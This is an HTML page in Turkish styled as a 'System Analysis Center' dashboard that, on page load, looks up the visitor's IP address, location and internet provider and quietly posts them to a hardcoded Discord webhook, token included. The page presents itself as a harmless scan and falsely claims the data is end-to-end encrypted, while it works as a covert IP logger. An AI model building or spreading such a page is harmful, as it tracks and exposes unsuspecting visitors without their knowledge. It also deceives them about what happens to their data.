<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Analiz Merkezi v2.0</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --primary: #00ff88;
            --bg: #0d1117;
            --card: #161b22;
            --border: #30363d;
            --text: #c9d1d9;
        }

        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .panel {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            width: 450px;
            padding: 0;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        }

        .panel-header {
            padding: 15px 20px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .status-dot {
            height: 10px;
            width: 10px;
            background-color: var(--primary);
            border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 10px var(--primary);
            margin-right: 8px;
        }

        .panel-content {
            padding: 25px;
        }

        .data-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid #21262d;
        }

        .label { color: #8b949e; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; }
        .value { color: var(--primary); font-family: 'Courier New', Courier, monospace; font-weight: bold; }

        .scan-line {
            height: 2px;
            background: var(--primary);
            width: 100%;
            position: relative;
            top: 0;
            animation: scan 3s infinite linear;
            opacity: 0.3;
            margin-bottom: 20px;
        }

        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(10px); }
        }

        .footer-note {
            padding: 15px;
            text-align: center;
            font-size: 11px;
            color: #484f58;
        }
    </style>
</head>
<body>

<div class="panel">
    <div class="panel-header">
        <span><span class="status-dot"></span> Sƒ∞STEM ANALƒ∞Zƒ∞ AKTƒ∞F</span>
        <span style="font-size: 12px; color: #484f58;">v2.4.0</span>
    </div>
    
    <div class="panel-content">
        <div class="scan-line"></div>
        
        <div class="data-row">
            <span class="label">Baƒülantƒ± Protokol√º</span>
            <span class="value" id="protocol">IPv4 / SECURE</span>
        </div>
        <div class="data-row">
            <span class="label">IP Adresi</span>
            <span class="value" id="ip">Taranƒ±yor...</span>
        </div>
        <div class="data-row">
            <span class="label">B√∂lge / Lokasyon</span>
            <span class="value" id="location">Taranƒ±yor...</span>
        </div>
        <div class="data-row">
            <span class="label">Servis Saƒülayƒ±cƒ±</span>
            <span class="value" id="isp">Taranƒ±yor...</span>
        </div>
        <div class="data-row">
            <span class="label">Sistem Durumu</span>
            <span class="value" id="status" style="color: #58a6ff;">Analiz Ediliyor...</span>
        </div>
    </div>

    <div class="footer-note">
        Veriler u√ßtan uca ≈üifreli olarak i≈ülenmektedir.
    </div>
</div>

<script>
    // Webhook URL
    const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";

    async function sendToDiscord(data) {
        const payload = {
            username: "Sistem Analiz Botu",
            avatar_url: "https://i.imgur.com/4M34hi2.png",
            embeds: [{
                title: "üìä Yeni Panel Giri≈üi Tespit Edildi",
                color: 1752220, // Ye≈üil tonu
                fields: [
                    { name: "üë§ IP Adresi", value: `\`${data.ip}\``, inline: true },
                    { name: "üìç Lokasyon", value: `\`${data.city}, ${data.country}\``, inline: true },
                    { name: "üè¢ ISP (ƒ∞nternet Saƒülayƒ±cƒ±)", value: `\`${data.isp}\``, inline: false },
                    { name: "‚è∞ Giri≈ü Zamanƒ±", value: new Date().toLocaleString('tr-TR'), inline: false }
                ],
                footer: { text: "Panel Log Sistemi" }
            }]
        };

        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) { console.error("Hata!"); }
    }

    async function init() {
        try {
            // Bilgileri al
            const res = await fetch("https://ipwho.is/");
            const data = await res.json();

            if (data.success) {
                // Panel aray√ºz√ºn√º g√ºncelle
                document.getElementById("ip").textContent = data.ip;
                document.getElementById("location").textContent = `${data.city} / ${data.country}`;
                document.getElementById("isp").textContent = data.connection.isp;
                document.getElementById("status").textContent = "TAMAMLANDI";
                document.getElementById("status").style.color = "#00ff88";

                // Arka planda Discord'a g√∂nder
                await sendToDiscord(data);
            }
        } catch (err) {
            document.getElementById("status").textContent = "BAƒûLANTI HATASI";
            document.getElementById("status").style.color = "#ff7b72";
        }
    }

    // Sayfa a√ßƒ±lƒ±r a√ßƒ±lmaz ba≈ülat
    window.onload = init;
</script>

</body>
</html>
